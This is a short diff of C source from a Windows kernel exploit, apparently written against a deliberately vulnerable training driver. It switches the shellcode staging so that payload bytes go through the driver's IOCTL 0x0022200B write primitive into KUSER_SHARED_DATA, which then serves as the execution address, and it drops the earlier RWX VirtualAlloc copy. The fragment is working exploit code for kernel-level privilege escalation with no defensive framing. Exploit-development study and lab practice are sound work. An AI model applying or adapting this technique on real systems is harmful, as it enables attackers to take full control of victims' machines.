@@ -294,7 +294,7 @@ bool ExecuteShellcodeByNtQueryIntervalProfile()
 
 void *GenerateShellCode(HANDLE driverHandle)
 {
-    int shellCodeLen=0;
+    //int shellCodeLen=0;
     void *shellcode=NULL;
     size_t payloadSize = 0;
     int payloadSizeInEight=0;
@@ -321,16 +321,16 @@ void *GenerateShellCode(HANDLE driverHandle)
     }
 
     printf("[+] Shellcode size with padding: %i\n",payloadSize);
-    shellcode= VirtualAlloc(0,payloadSize+10, 0x3000,0x40); 
+    //shellcode= VirtualAlloc(0,payloadSize+10, 0x3000,0x40); 
 
-    RtlMoveMemory(shellcode,payload,oldPayloadSize);
+    //RtlMoveMemory(shellcode,payload,oldPayloadSize);
 
     printf("[+] Payload size by eigth: %i\n",payloadSizeInEight);
 
     for (int i = 0; i < payloadSizeInEight;i++)
     {
         
-        SendToDriver(driverHandle,0x0022200B,(void*) ( ( (unsigned long long)shellcode)+i), (void*) (((unsigned long long)KUSER_SHARED_DATA)+i) );
+        SendToDriver(driverHandle,0x0022200B,(void*) ( ( (unsigned long long)payload)+i), (void*) (((unsigned long long)KUSER_SHARED_DATA)+i) );
     }
 
     return (void*) KUSER_SHARED_DATA;
